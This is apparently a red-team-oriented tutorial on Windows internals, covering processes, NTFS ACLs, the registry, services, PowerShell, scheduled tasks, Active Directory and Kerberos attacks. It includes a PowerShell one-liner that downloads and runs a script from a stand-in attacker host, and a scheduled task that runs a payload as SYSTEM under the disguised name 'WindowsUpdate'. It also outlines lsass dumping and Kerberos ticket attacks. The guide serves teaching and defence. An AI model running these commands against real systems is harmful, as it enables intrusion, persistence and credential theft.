Windows Fundamentals — The Complete Foundation

2026-06-04 · 9 min read · Learn · windows fundamentals powershell active-directory red-team privesc

Architecture, filesystem, registry, users, NTFS permissions, processes, services, PowerShell, Active Directory, event logs, and a red team lens on every layer.

Windows dominates enterprise environments. Most corporate targets you will encounter run Windows — workstations, servers, domain controllers. Understanding how Windows works at a deep level is not optional for anyone doing offensive security, incident response, or system administration.

This guide covers the OS from the ground up: the filesystem, identity model, registry, processes, services, PowerShell, and Active Directory. Red team perspectives are embedded throughout every section — because understanding how things get abused is the fastest way to understand why they're designed the way they are.

01 Windows Architecture Overview

Windows splits execution into two privilege levels:

  • User mode — applications, services, subsystems. Restricted hardware access. Crashes here affect only the process.
  • Kernel mode — the Windows kernel (ntoskrnl.exe), hardware abstraction layer (hal.dll), drivers. Full hardware access. Crashes here are BSODs.
text 
┌─────────────────────────────────────────────────┐
│  USER MODE                                       │
│  Win32 Apps   .NET Apps   Services   Win32 API  │
│       ↕            ↕          ↕         ↕       │
│  ntdll.dll  (syscall boundary)                  │
├─────────────────────────────────────────────────┤
│  KERNEL MODE                                     │
│  Windows Kernel (ntoskrnl.exe)                  │
│  HAL · Drivers · Win32k.sys (GUI)               │
└─────────────────────────────────────────────────┘

Key system processes (always running, always in Task Manager):

ProcessPIDPurposeRed team note
`System`4Kernel threadsParent of smss.exe
`smss.exe`—Session ManagerFirst user-mode process
`csrss.exe`—Client/Server RuntimeWin32 subsystem
`wininit.exe`—Windows InitStarts services.exe, lsass.exe
`lsass.exe`—Local Security Auth**Stores credentials in memory**
`services.exe`—Service Control ManagerParent of all services
`svchost.exe`manyService hostMany services share one host process

`winlogon.exe`—Logon/LogoffHandles Ctrl+Alt+Del

lsass.exe is the highest-value target in memory. It holds NTLM hashes, Kerberos tickets, and plaintext credentials (on older configs). Mimikatz dumps from lsass are the backbone of credential-based lateral movement.

Windows uses NTFS (New Technology File System) as its primary filesystem. Unlike Linux's single tree, Windows uses drive letters — C:\, D:\, etc.

`C:\Windows\`OS files`System32`, `SysWOW64`
`C:\Windows\System32\`Core system DLLs and executablesDLL hijack target
`C:\Windows\SysWOW64\`32-bit binaries on 64-bit Windows
`C:\Windows\Temp\`System temp — writableDrop payloads
`C:\Users\`All user profilesCredentials, tokens, history

`C:\Users\<user>\Documents\`Documents
`C:\Users\<user>\AppData\`Application data (hidden)Browser creds, app configs

Alternate Data Streams (ADS)

NTFS supports multiple data streams per file. The main content is the $DATA stream. Additional streams are hidden by default — dir doesn't show them.

powershell 
# Write to an alternate stream
echo "hidden payload" > file.txt:hidden
# Read it back
more < file.txt:hidden
# Discover ADS
dir /r
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'

Malware hides payloads and config in ADS. Tools like streams.exe (Sysinternals) or PowerShell can enumerate them.

03 Users, Groups & Privileges

Local Accounts

Every Windows machine has a local SAM (Security Account Manager) database stored at C:\Windows\System32\config\SAM. It stores local user accounts and their NTLM password hashes. The SAM is locked by the OS while Windows runs — you need SYSTEM privileges or a volume shadow copy to extract it.

Built-in local accounts:

AccountPurposeNotes
`Administrator`Full local adminDisabled by default in modern Windows
`Guest`Limited accessDisabled by default
`DefaultAccount`System-managed
`WDAGUtilityAccount`Windows Defender App Guard

Built-in Groups

GroupPrivilege levelRed team relevance
`Administrators`Full local adminTarget for lateral movement
`Remote Desktop Users`RDP accessLateral movement
`Remote Management Users`WinRM/PSRemoting accessLateral movement
`Backup Operators`Read any file for backupCan read SAM/NTDS
`Event Log Readers`Read event logsRecon without admin
`DnsAdmins`DNS management (domain)DLL injection via DNS
`Server Operators`Manage servicesCan modify service binaries

Windows Privileges (Tokens)

Every process runs with an access token that contains the user's SID, group SIDs, and a list of privileges. Privileges are capabilities beyond normal file permissions — they apply system-wide.

High-value privileges for privilege escalation:

PrivilegeAbuse potential
`SeImpersonatePrivilege`Potato attacks (JuicyPotato, RoguePotato, PrintSpoofer) → SYSTEM
`SeAssignPrimaryTokenPrivilege`Same as above
`SeBackupPrivilege`Read any file — dump SAM, NTDS
`SeRestorePrivilege`Write any file — overwrite binaries
`SeDebugPrivilege`Attach to any process — dump lsass
`SeTakeOwnershipPrivilege`Take ownership of any object
`SeLoadDriverPrivilege`Load arbitrary kernel drivers
`SeCreateSymbolicLinkPrivilege`Symlink attacks

SeImpersonatePrivilege is the most common: IIS app pools, SQL Server service accounts, and many service accounts have it by default. If you get code execution as one of these, you get SYSTEM.

04 NTFS Permissions & ACLs

NTFS uses Access Control Lists (ACLs) — far more granular than Linux's rwx model. Every file and folder has a DACL (Discretionary ACL) containing ACEs (Access Control Entries), each granting or denying specific rights to a specific principal (user or group).

NTFS permission types:

PermissionMeaning
Full ControlRead, write, modify, delete, change permissions, take ownership
ModifyRead, write, execute, delete — not change permissions
Read & ExecuteRead and run files
List Folder ContentsDirectory listing
ReadRead file/folder
WriteCreate files, write data

Permission inheritance — child objects inherit permissions from parent by default. Explicit ACEs override inherited ones.

Why This Matters for Attackers

Weakly configured ACLs are among the most common Windows privilege escalation vectors:

  • Writable service binary — if a service executable is writable by your user, replace it with a payload
  • Writable service binary directory — DLL hijacking: drop a malicious DLL that the service loads
  • Writable registry service key — modify ImagePath to point to your payload
  • GenericWrite/GenericAll on AD objects — in Active Directory, ACL misconfigurations let you reset passwords, add group members, or perform targeted Kerberoasting
powershell ACL enumeration and weak permission hunting 
# View ACL on a file or folder
Get-Acl C:\Windows\System32
Get-Acl C:\ProgramData\MyApp | Format-List
(Get-Acl C:\temp\file.txt).Access

# CMD
icacls C:\Windows\System32
icacls C:\Program Files\VulnerableApp

# Find writable directories in Program Files (privesc check)
Get-ChildItem "C:\Program Files" -Recurse -ErrorAction SilentlyContinue | 
  ForEach-Object { 
    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
    $acl.Access | Where-Object { 
      $_.IdentityReference -match 'Everyone|BUILTIN\\Users|Authenticated Users' -and
      $_.FileSystemRights -match 'Write|FullControl|Modify'
    } | ForEach-Object { $_.IdentityReference.Value + " -> " + $_.FileSystemRights + " on " + $_.Path }
  }

# Check service binary permissions
Get-WmiObject Win32_Service | Select-Object Name, PathName, StartName | 
  Where-Object { $_.PathName -ne $null } | ForEach-Object {
    $path = $_.PathName -replace '"',''
    $path = ($path -split ' ')[0]
    if (Test-Path $path) {
      $acl = Get-Acl $path -ErrorAction SilentlyContinue
      $acl.Access | Where-Object {
        $_.FileSystemRights -match 'Write|FullControl' -and
        $_.IdentityReference -notmatch 'SYSTEM|Administrators|TrustedInstaller'
      } | ForEach-Object { "WRITABLE SERVICE: $path" }
    }
  }

05 The Windows Registry

The Registry is a hierarchical database that stores OS and application configuration. It's central to how Windows boots, how services start, and how applications behave — and it's riddled with persistence and privilege escalation opportunities.

Registry Hive Structure

HiveAbbreviationContents
`HKEY_LOCAL_MACHINE``HKLM`System-wide config — hardware, services, software
`HKEY_CURRENT_USER``HKCU`Currently logged-in user's settings
`HKEY_USERS``HKU`All user profiles (includes HKCU)
`HKEY_CLASSES_ROOT``HKCR`File associations, COM objects
`HKEY_CURRENT_CONFIG``HKCC`Hardware profile in use

Critical Registry Keys

  ObjectName  = account it runs as

# Autorun — executes on every user login

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Installed software

# LSA secrets / cached credentials

# AlwaysInstallElevated — if both are 1, MSI files run as SYSTEM

  EnableLUA       = 1 (UAC on)

Registry hive files on disk (locked while Windows runs — read via VSS or offline):
- C:\Windows\System32\config\SAM — local account hashes
- C:\Windows\System32\config\SYSTEM — boot key (needed to decrypt SAM)
- C:\Windows\System32\config\SECURITY — LSA secrets
- C:\Windows\System32\config\SOFTWARE — software config

06 Processes & Services

Processes

Every running program is a process with a PID, a parent PID, an access token (identity), and memory space. Windows processes can spawn child processes — this parent-child relationship is a key signal in EDR detections (e.g., winword.exe spawning powershell.exe is almost always malware).

Process injection — attackers inject shellcode into legitimate processes to hide under trusted process names and inherit their tokens.

Services

Services are long-running background processes managed by the Service Control Manager (SCM), which itself runs as services.exe. Services can run as:
- LocalSystem (SYSTEM) — full OS privileges
- LocalService — reduced privileges, no network credentials
- NetworkService — reduced privileges with network identity
- A specific domain or local account

Service configuration lives in the registry at HKLM\SYSTEM\CurrentControlSet\Services\<name>.

Service privesc vectors:
1. Unquoted service path — if the path has spaces and isn't quoted, Windows tries each space-separated segment as an executable
2. Writable service binary — replace the exe with a payload
3. Writable service registry key — modify ImagePath
4. Weak service permissions — SERVICE_CHANGE_CONFIG lets you change the binary path

07 CMD & PowerShell

CMD (Command Prompt)

cmd.exe is the legacy command interpreter. Limited scripting, no object pipeline. Still found everywhere and useful when PowerShell is restricted or monitored.

PowerShell

PowerShell is a full scripting environment built on .NET. Unlike CMD, PowerShell works with .NET objects — you're not parsing text, you're passing structured data between cmdlets.

PowerShell execution policy — a speed bump, not a security boundary:

text 
Restricted   — no scripts (default on desktop)
AllPolicy    — only signed scripts
RemoteSigned — local scripts run; downloaded scripts need a signature
Bypass       — nothing is blocked

It can always be bypassed:

powershell 
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"

PowerShell logging — defenders enable:
- Script Block Logging — logs every script block executed (even obfuscated, after deobfuscation)
- Module Logging — logs module pipeline execution
- Transcription — full session transcript to file
- AMSI — Antimalware Scan Interface, scans script content before execution

Knowing these exist shapes how attacks are detected and how defenders hunt.

09 Scheduled Tasks

Scheduled Tasks are Windows' equivalent of cron — they execute programs on a schedule, at boot, at login, or on system events. Like cron, they're a primary persistence and privilege escalation vector.

Tasks are stored as XML files in C:\Windows\System32\Tasks\ and older .job files in C:\Windows\SysWOW64\Tasks\.

Attack scenarios:
- Find a task running as SYSTEM that calls a writable script → overwrite it
- Find a task calling a binary in a writable directory → DLL hijack or binary replacement
- Create a scheduled task for persistence (survives reboots, hides in task list)

powershell Scheduled tasks — enumeration and abuse 
# List all scheduled tasks
Get-ScheduledTask
Get-ScheduledTask | Select TaskName, TaskPath, State
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# Detailed info on a specific task
Get-ScheduledTask -TaskName "MyTask" | Get-ScheduledTaskInfo
(Get-ScheduledTask -TaskName "MyTask").Actions
(Get-ScheduledTask -TaskName "MyTask").Triggers
(Get-ScheduledTask -TaskName "MyTask").Principal   # what user it runs as

# Find tasks running as SYSTEM with writable action path
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $task.Actions | ForEach-Object {
        if ($_.Execute -and (Test-Path $_.Execute -ErrorAction SilentlyContinue)) {
            $acl = Get-Acl $_.Execute -ErrorAction SilentlyContinue
            $acl.Access | Where-Object {
                $_.FileSystemRights -match 'Write|FullControl' -and
                $_.IdentityReference -notmatch 'SYSTEM|Administrators'
            } | ForEach-Object {
                "WRITABLE: $($task.TaskName) -> $($_.Execute)"
            }
        }
    }
}

# Create a scheduled task (persistence)
$action  = New-ScheduledTaskAction -Execute "C:\temp\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId SYSTEM -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Principal $principal

# CMD — create task (persistence, runs at startup as SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\payload.exe" /sc onstart /ru SYSTEM /f

# Delete a task
Unregister-ScheduledTask -TaskName "WindowsUpdate" -Confirm:$false
schtasks /delete /tn "WindowsUpdate" /f

# Task XML files — examine directly
Get-Content "C:\Windows\System32\Tasks\Microsoft\Windows\MyTask"

11 Active Directory Fundamentals

Active Directory (AD) is the directory service used by virtually every enterprise Windows network. It centralises authentication and authorisation across the domain. Understanding AD is mandatory for any enterprise red team or blue team work.

Core Concepts

Domain — a logical grouping of objects (users, computers, groups) that share a common database and security policy. Identified by a DNS name, e.g. corp.local.

Domain Controller (DC) — a server running Active Directory Domain Services (AD DS). Authenticates users, enforces policy, and holds the AD database (NTDS.dit).

Forest — one or more domains with trust relationships, sharing a schema and global catalog.

Organisational Units (OUs) — containers within a domain for organising objects and applying Group Policy.

Key Objects

ObjectDescription
**User**Has a SAMAccountName, UPN, SID, password hash in NTDS
**Computer**Machine account — ends in `$` (e.g. `WORKSTATION01$`)
**Group**Security group (for ACLs) or Distribution group (email)
**Group Policy Object (GPO)**Policy applied to OUs — controls settings for all objects within
**Service Principal Name (SPN)**Identifier for a service instance — used by Kerberos

Authentication: NTLM vs Kerberos

NTLM (challenge-response):
1. Client → Server: NEGOTIATE
2. Server → Client: CHALLENGE (nonce)
3. Client → Server: AUTHENTICATE (hash of nonce + password hash)

NTLM hashes can be captured (Responder) and cracked offline, or used directly in Pass-the-Hash attacks.

Kerberos (ticket-based, preferred in AD):
1. Client → KDC (DC): AS-REQ — "I am Alice, give me a TGT"
2. KDC → Client: AS-REP — TGT encrypted with krbtgt hash
3. Client → KDC: TGS-REQ — "I need a ticket for service X" (presents TGT)
4. KDC → Client: TGS-REP — service ticket encrypted with service account's hash
5. Client → Service: AP-REQ — presents service ticket

Attack surface on Kerberos:
- Kerberoasting — any domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's hash → crack offline
- AS-REP Roasting — accounts with DONT_REQUIRE_PREAUTH set return an AS-REP that contains encrypted data → crack offline without any credentials
- Pass-the-Ticket — inject a Kerberos ticket into your session
- Golden Ticket — forge a TGT using the krbtgt hash → impersonate any user forever
- Silver Ticket — forge a service ticket using the service account hash

13 UAC & Bypass Techniques

UAC (User Account Control) prompts for elevation when an admin-level operation is requested — even for Administrators. It's a consent mechanism, not a security boundary, but it prevents silent privilege escalation.

UAC levels:
- Always notify — prompt for everything
- Default — prompt only for app changes, not Windows settings
- Notify only when apps make changes (no secure desktop) — same but no dimming
- Never notify — UAC off

Token split — when an admin logs in with UAC enabled, they get two tokens: a standard user token for normal work and a high-integrity admin token for elevated operations. Most processes run with the standard token.

Integrity levels: Every process and object has an integrity level. Standard user = Medium. Elevated = High. SYSTEM = System. UAC is essentially a Medium → High transition.

UAC bypass — techniques that elevate from Medium to High without a UAC prompt, by abusing auto-elevating processes, COM object hijacking, or DLL injection into high-integrity processes. Well-known examples: fodhelper.exe, eventvwr.exe, sdclt.exe registry hijacks.

# Check current integrity level
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups |
    Where { $_.Value -eq 'S-1-16-12288' } | Select Value  # S-1-16-12288 = High

whoami /groups | findstr Level

# Check UAC setting

17 Key Takeaways

Concepts to have cold:

  • lsass.exe is the credential goldmine — it holds hashes and tickets for every logged-in user. Getting SYSTEM and dumping lsass is the backbone of Windows credential theft.
  • The SAM database stores local hashes; NTDS.dit stores all domain hashes. Both are locked at runtime — you need VSS, reg save, or DCSync.
  • NTLM hashes are pass-the-hash-able. You don't need to crack them to use them.
  • SeImpersonatePrivilege on a service account → Potato attack → SYSTEM. This is reliably true on unpatched or default configs.
  • Registry Run keys, scheduled tasks, and services are the three main persistence locations. Check all three when hunting implants.
  • Kerberoasting: any domain user can request a service ticket for any SPN. Hash goes offline for cracking. No logs until cracking succeeds.
  • Always run whoami /all on every new Windows shell — privileges and groups tell you the entire escalation story at a glance.
  • UAC is not a security boundary. It's a speedbump against accidental elevation. Medium-integrity admin account + known bypass = High integrity in seconds.
  • PowerShell Script Block Logging (event 4104) records everything. Assume your commands are being logged. Understand what defenders see.
  • BloodHound maps the entire AD graph visually — run SharpHound, import, and follow the attack paths. It finds privilege escalation routes through ACL chains that no manual enumeration would find.

Tools to know:
nmap, crackmapexec, impacket, evil-winrm, mimikatz, rubeus, bloodhound/sharphound, powerup, winpeas, sysmon, autoruns, procmon

Windows enterprise environments are complex by design — that complexity creates attack surface. Every feature (delegation, WMI, COM, DFS, RPC) is also a potential vector. The deeper your understanding of how Windows actually works, the faster you move on every engagement.
